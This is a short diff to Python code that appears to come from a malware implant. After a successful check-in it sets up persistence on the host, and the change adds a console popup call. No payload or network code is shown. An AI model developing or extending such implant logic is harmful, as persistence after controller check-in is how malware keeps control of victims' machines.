@@ -274,6 +274,7 @@ CRYPTO_MODULE_PLACEHOLDER
             if self.checkIn():
                 try:
                     self.create_persistence()
+                    self.show_console_popup()
                 except Exception as e:
                     print(f"Error during persistence or console popup: {e}")
                 break
